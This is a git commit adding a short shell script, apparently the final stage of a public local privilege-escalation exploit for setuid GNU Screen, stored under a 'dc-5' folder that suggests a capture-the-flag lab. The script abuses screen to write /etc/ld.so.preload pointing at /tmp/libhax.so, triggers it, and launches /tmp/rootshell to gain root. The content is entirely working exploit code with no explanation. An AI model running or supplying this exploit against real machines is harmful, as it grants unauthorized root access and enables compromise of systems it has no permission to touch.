ce0d9f75ce7bf277328a6f995e294680c623fbd4
Shubhankar thakur <53370662+saims0n@users.noreply.github.com>
2021-01-14 18:48:08 +0530

    Add files via upload

---
+++ dc-5/41154.sh
@@ -0,0 +1,7 @@
+echo "[+] Now we create our /etc/ld.so.preload file..."
+cd /etc
+umask 000 # because
+screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
+echo "[+] Triggering..."
+screen -ls # screen itself is setuid, so... 
+/tmp/rootshell
